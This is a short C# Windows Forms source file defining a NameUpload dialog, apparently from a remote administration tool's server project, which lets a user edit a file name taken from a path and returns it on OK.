using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace EZRATServer.Forms
{
    public partial class NameUpload : Form
    {
        public NameUpload(string oldName)
        {
            InitializeComponent();
            this.btnOk.Click += Validate;
            this.tbxName.Text = oldName.Substring(oldName.LastIndexOf("\\") + 1);
        }

        public string Dialog()
        {
            string result = string.Empty;
            if(this.ShowDialog() == DialogResult.OK)
            {
                result = this.tbxName.Text;
            }
            return result;
        }

        private void Validate(object sender,EventArgs e)
        {
            this.DialogResult = DialogResult.OK;
        }
    }
}
